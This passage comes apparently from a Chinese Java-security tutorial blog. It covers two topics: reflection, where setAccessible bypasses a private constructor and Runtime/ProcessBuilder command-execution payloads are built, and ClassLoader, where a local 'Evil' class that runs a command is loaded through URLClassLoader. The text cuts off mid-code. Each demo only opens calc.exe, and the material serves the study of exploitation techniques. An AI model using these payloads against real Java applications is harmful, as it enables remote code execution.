class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">User</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, Integer age)</span> {</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getName());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> {</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User [name="</span> + name + <span class="string">", age="</span> + age + <span class="string">"]"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>测试的Main函数如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Class</span> <span class="variable">userClass</span> <span class="operator">=</span> Class.forName(<span class="string">"com.Anchor.User"</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user0</span> <span class="operator">=</span> (User) userClass.newInstance(); <span class="comment">//通过Class对象的newInstance方法调用无参构造函数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cs1</span> <span class="operator">=</span> userClass.getConstructor(); <span class="comment">//通过getConstructor获得无参构造函数的Constructor对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> (User) cs1.newInstance(); <span class="comment">//第一种是newInstance</span></span><br><span class="line">        System.out.println(<span class="string">"Class对象的newInstance方法:\t"</span> + user0);</span><br><span class="line">        System.out.println(<span class="string">"getConstructor[no parameters]:\t"</span> + user1);</span><br><span class="line">        System.out.println(<span class="string">"--------------------------------------------"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 得到只有一个参数的构造函数的Constructor对象,使用getDeclaredConstructor方法，可以获得私有方法的Constructor对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cs2</span> <span class="operator">=</span> userClass.getDeclaredConstructor(String.class);</span><br><span class="line">        cs2.setAccessible(<span class="literal">true</span>); <span class="comment">//由于是private必须设置可访问</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> (User) cs2.newInstance(<span class="string">"anch0r"</span>);</span><br><span class="line">        System.out.println(<span class="string">"getDeclaredConstructor[one parameter]:\t"</span> + user2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"--------------------------------------------"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cs3</span> <span class="operator">=</span> userClass.getConstructor(String.class, Integer.class); <span class="comment">//得到有两个参数的构造函数的Constructor对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user3</span> <span class="operator">=</span> (User) cs3.newInstance(<span class="string">"anch0r2"</span>, <span class="number">100</span>);</span><br><span class="line">        System.out.println(<span class="string">"getConstructor[two parameters]:\t"</span> + user3);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>最后运行结果为：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class对象的newInstance方法:User [name=<span class="literal">null</span>, age=<span class="literal">null</span>]</span><br><span class="line">getConstructor[no parameters]:User [name=<span class="literal">null</span>, age=<span class="literal">null</span>]</span><br><span class="line">--------------------------------------------</span><br><span class="line">getDeclaredConstructor[one parameter]:User [name=anch0r, age=<span class="literal">null</span>]</span><br><span class="line">--------------------------------------------</span><br><span class="line">getConstructor[two parameters]:User [name=anch0r2, age=<span class="number">100</span>]</span><br></pre></td></tr></tbody></table></figure><p>接下来以两个例子来说明Constructor类和相关的一些方法引入的意义。</p><h3 id="设置setAccessible-true-绕过访问权限"><a href="#设置setAccessible-true-绕过访问权限" class="headerlink" title="设置setAccessible(true)绕过访问权限"></a>设置setAccessible(true)绕过访问权限</h3><p>你也许注意到上面这个例子中的一个方法:<code>setAccessible(true)</code>。</p><p>在程序中，调用这一方法，可以取消java语言访问控制的检查能力。我们通过<code>getDeclaredConstructor</code>获得一个私有构造函数的Method对象后，可以用<code>setAccessible(true)</code>来实现绕过私有权限的访问控制。而从上文我们知道，就是因为<code>java.lang.Runtime</code>类中的无参构造函数是私有的我们才没法通过Class对象的<code>newInstance</code>方法来实例化对象，现在我们有了一个可以绕过<code>private</code>的方式了，那么就来利用<code>setAccessible(true)</code>改造之前的命令执行代码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.Runtime"</span>);<span class="comment">//老规矩，获取一个class对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cs</span> <span class="operator">=</span> evilClass.getDeclaredConstructor(); <span class="comment">//利用getDeclaredConstructor获取私有的无参构造函数的Constructor对象</span></span><br><span class="line">        cs.setAccessible(<span class="literal">true</span>); <span class="comment">// 取消java的访问控制的检查机制，绕过访问控制</span></span><br><span class="line">        evilClass.getMethod(<span class="string">"exec"</span>, String.class).invoke(cs.newInstance(), <span class="string">"calc.exe"</span>);</span><br><span class="line">        <span class="comment">// 通过无参构造函数的Constructor对象实例化，再借助getMethod获取exec的Method类，最后调用exec函数。</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行后成功弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231231151233188.png" alt="成功弹出计算器"></p><h3 id="调用java-lang-ProcessBuilder不同类型的构造函数实现命令执行"><a href="#调用java-lang-ProcessBuilder不同类型的构造函数实现命令执行" class="headerlink" title="调用java.lang.ProcessBuilder不同类型的构造函数实现命令执行"></a>调用<code>java.lang.ProcessBuilder</code>不同类型的构造函数实现命令执行</h3><p>在构造命令执行的payload时，除了<code>Runtime</code>类，<code>ProcessBuilder</code>类也是比较常用的，一般使用反射来获取其构造函数，然后调用其中的<code>start()</code> 方法来执行命令。</p><p>我们先通过查看源码研究一下这个类的的构造函数：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231231152715024.png" alt="ProcessBuilder类两种构造方法"></p><p>可以看到该类构造函数有两个重载方式。</p><h4 id="第一个重载"><a href="#第一个重载" class="headerlink" title="第一个重载"></a>第一个重载</h4><p>第一个重载需要传入的参数类型是列表类型<code>List</code>:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(List&lt;String&gt; command)</span> {</span><br><span class="line">        <span class="keyword">if</span> (command == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        <span class="built_in">this</span>.command = command;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>我们在使用<code>getConstructor</code>获得Constructor对象时，需要将传参类型修改为<code>List.class</code>,所以我们能够立刻写出下面这个payload：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">((ProcessBuilder)evilClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">"calc.exe"</span>))).start();</span><br></pre></td></tr></tbody></table></figure><p>这里用<code>Arrays.asList</code>方法将字符串<code>"calc.exe"</code>转为了列表类型再传入到Constructor类的newInstance方法中，从而执行构造函数<code>public ProcessBuilder(List&lt;String&gt; command)</code>。</p><p>这里虽然执行成功，但是有个缺点，使用了强制类型转换(也就是第二行前面的<code>(ProcessBuilder)</code>语法)，然而在一般情况下，表达式上下文是没有这种语法的。我们仍然需要用<code>java反射</code>改进这一步，避免使用强制类型转换，如下面这行代码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);   evilClass.getMethod(<span class="string">"start"</span>).invoke(evilClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">"calc.exe"</span>)));</span><br></pre></td></tr></tbody></table></figure><p>这里通过<code>getMethod("start")</code> 获取到<code>start</code>方法，然后 <code>invoke</code> 执行， <code>invoke</code> 的第一个参数就是<code>ProcessBuilder Object</code>了,就不需要再进行强制类型转换了。</p><p>运行成功弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231231154251434.png" alt="成功弹出计算器"></p><h4 id="第二个重载"><a href="#第二个重载" class="headerlink" title="第二个重载"></a>第二个重载</h4><p>第二个重载需要传入的参数类型比较特殊，是可变长的参数</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span> {</span><br><span class="line">    <span class="built_in">this</span>.command = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(command.length);</span><br><span class="line">    <span class="keyword">for</span> (String arg : command)</span><br><span class="line">        <span class="built_in">this</span>.command.add(arg);</span><br><span class="line">}b</span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong>java可变长参数</strong>:</p><p>java一般使用以使用 <code>...</code> 这样的语法来表示这个函数的参数个数是可变的,在编译时java会将可变长参数编译成一个数组类型，可以说下面这两种形式是等价的：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span> {}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...names)</span> {}</span><br></pre></td></tr></tbody></table></figure><p>对于hello这个函数，我们就可以传入一个字符串数组类型的数据，比如<code>String[] names = {"hello", "world"};</code></p></blockquote><p>如果我们要实现对这第二个构造函数的重载，就要给它传入可变长参数。我们可以直接将可变长参数当成数组，也就是说将字符串数组类型的class对象:<code>String[].class</code> 传给 getConstructor作为参数类型 ，从而获取 <code>ProcessBuilder </code>类这第二种重载的构造函数。</p><p>具体代码如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">evilClass.getMethod(<span class="string">"start"</span>).invoke(evilClass.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]{{<span class="string">"calc.exe"</span>}}));</span><br></pre></td></tr></tbody></table></figure><p>运行后成功弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231231160103034.png" alt="成功弹出计算器"></p><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这一篇主要是解决上一篇的一些疑惑，同时在引入了<code>Constructor</code>类概念后加入了一些新的玩法。</p><p><strong>参考文章：</strong></p><p><a href="https://github.com/phith0n/JavaThings">《java安全漫谈》</a></p><p><a href="https://xz.aliyun.com/t/9117#toc-0">JAVA安全基础（二）– 反射机制</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0-1 javaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全之ClassLoader</title>
      <link href="/2023/12/24/java%E5%AE%89%E5%85%A8%E4%B9%8BClassLoader/"/>
      <url>/2023/12/24/java%E5%AE%89%E5%85%A8%E4%B9%8BClassLoader/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>通过上一文的流程图我们可以知道，一切Java类在编译后都必须经过JVM加载才能运行，用来加载类的类就是类加载器（<code>ClassLoader</code>），也就是<code>forName</code>第二个重载方式中所要填写的第三个参数，类加载器负责将class字节码转换成内存的class类,除了系统自定义的三类加载器外，java允许用户编写自定义加载器来完成类的加载过程。java安全中常常需要远程加载恶意类文件来完成漏洞的利用，所以学习类加载器的编写也是很重要的。</p><blockquote><p><em><strong>注：本文只是从安全角度去理解类加载器，并不涉及过深入的内容，如果想了解更加深入的内容，请移步至这本书：《深入理解java虚拟机》</strong></em>。</p></blockquote><h2 id="0x01-系统自定义加载器"><a href="#0x01-系统自定义加载器" class="headerlink" title="0x01  系统自定义加载器"></a>0x01  系统自定义加载器</h2><p>首先说一下系统自定义的三个类加载器，分别是引导类加载器(<code>BootstrapClassLoader</code>)、扩展类加载器(<code>ExtensionsClassLoader</code>)、App类加载器/系统类加载器(<code>AppClassLoader</code>)</p><blockquote><ol><li><code>BootstrapClassLoader</code> 负责加载 JVM 运行时核心类以及JVM本身，这些核心类位于 <code>JAVA_HOME/lib/rt.jar</code> 文件中，我们常用内置库 <code>java.xxx.* </code>都在里面，比如 <code>java.util.*</code>、<code>java.io.*</code>、<code>java.nio.*</code>、<code>java.lang.* </code>等等。这个 类加载器 比较特殊，它是由 C 代码实现的，我们将它称之为「根加载器」。</li><li><code>ExtensionClassLoader</code> 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，有很多 jar 包。</li><li><code>AppClassLoader</code> 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的。</li></ol></blockquote><p>正是通过这三个类加载器互相配合，完成了类的加载，当然加载过程十分复杂，还涉及到比较重要的“双亲委派”机制，由于本文就是初步了解，就不深入理解底层原理了。 </p><p>我们需要掌握的是接下来的用户自定义的类加载器，可以通过继承java.lang.ClassLoader类的方式编写属于自己的类加载器。</p><h2 id="0x02-java-lang-ClassLoader类中的核心方法"><a href="#0x02-java-lang-ClassLoader类中的核心方法" class="headerlink" title="0x02 java.lang.ClassLoader类中的核心方法"></a>0x02 java.lang.ClassLoader类中的核心方法</h2><p>在提及用户自定义类加载器之前，我们先来研究研究这个比较关键的类，<code>ClassLoader</code>类, 后文写的类都要继承自它并且调用它里面的成员方法。</p><p>在<code>rt.jar</code>包下的java.lang包下我们可以找到ClassLoader这个类的源码文件，下面我们将研究它的几个重要方法：</p><h3 id="loadClass-String-boolean"><a href="#loadClass-String-boolean" class="headerlink" title="loadClass(String, boolean)"></a>loadClass(String, boolean)</h3><p>该方法是核心方法，也是最常用的，用来加载指定的类，返回结果是一个class对象。源码如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) {</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) {</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) {</span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                    } <span class="keyword">else</span> {</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    }</span><br><span class="line">                } <span class="keyword">catch</span> (ClassNotFoundException e) {</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) {</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (resolve) {</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><blockquote><p>其中的parent为ClassLoader类的一个成员属性，而非子父类继承关系。</p></blockquote><p>在loadClass()方法中，它先使用了另外一个成员方法findLoadedClass(String)检查传入的这个类是否被加载过，如果已经被加载过，就不过任何操作，直接返回这个加载过的类的class对象；如果没被加载过，接着使用父加载器调用loadClass(String)方法，尝试通过父加载器加载指定类，若所有的父加载器都尝试失败后(即最终返回的值为null),交由当前ClassLoader重写的findClass方法去加载。</p><p>最后通过上述步骤找到对应的类，如果传入的resolve参数值为true，那么就会调用另外一个成员方法resolveClass(Class)方法来处理类。</p><h3 id="findClass-String"><a href="#findClass-String" class="headerlink" title="findClass(String)"></a>findClass(String)</h3><p>查找指定java类，返回值为一个Class对象。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException {</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>该方法是交由子类来修改覆盖的。</p><h3 id="findLoadedClass-String"><a href="#findLoadedClass-String" class="headerlink" title="findLoadedClass(String)"></a>findLoadedClass(String)</h3><p>前面已经说过，用来查找jvm当前是否已经加载过该类</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) {</span><br><span class="line">       <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">return</span> findLoadedClass0(name);</span><br><span class="line">   }</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass0(String name);</span><br></pre></td></tr></tbody></table></figure><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>用来定义一个java类，将字节码解析成jvm识别的Class对象。往往和findClass()方法配合使用。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, off, len, <span class="literal">null</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h3><p>链接指定Java类</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> {</span><br><span class="line">     resolveClass0(c);</span><br><span class="line"> }</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">resolveClass0</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="0x03-URLClassLoader"><a href="#0x03-URLClassLoader" class="headerlink" title="0x03 URLClassLoader"></a>0x03 URLClassLoader</h2><p>上面的系统自定义加载器类只可以满足加载java自身自带的一些类，但很多情况下我们需要的是能够加载本地磁盘或者网络外部的一些自己构造好的类。URLClassLoader满足了我们这一需求。</p><p>URLClassLoader是系统自带的继承自ClassLoader类的的类，它在ClassLoader基础上扩展了一些功能，看名字就知道它的功能与URL有关，它可以加载本地磁盘和网络中的jar包里的类文件。</p><h3 id="加载本地磁盘中的外部类"><a href="#加载本地磁盘中的外部类" class="headerlink" title="加载本地磁盘中的外部类"></a>加载本地磁盘中的外部类</h3><p>我们在本地编写一个恶意类，其中构造函数中写入执行命令的操作，这里还是以打开计算器为例演示：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"Loading the evilClass..."</span>);</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"cmd /c calc.exe"</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以通过javac将其编译为class文件，idea里可以直接选择“构建”中的“重新编译”来编译java文件生成class文件</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231224124545208.png" alt="idea中编译java文件"></p><p>此时在项目文件夹相应目录下会生成class文件</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231224134240690.png" alt="生成的evil.class文件"></p><p>在main函数中我们构造将该恶意类的文件路径构造成一个URL的实例，传入到URLClassLoader中，从而使程序可以加载恶意类，并进行实例化从而触发恶意类的构造函数,具体细节可以看注释：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">"G:\\javaSecurity\\javaSec\\out\\production\\javaSec\\"</span>); <span class="comment">//使用File获取文件路径</span></span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> file.toURI(); <span class="comment">//将得到的文件对象转为URI对象</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> uri.toURL(); <span class="comment">//将得到的URI对象转为URL对象</span></span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]{url}); <span class="comment">//通过得到的URL对象创建一个URLClassLoader实例。</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> 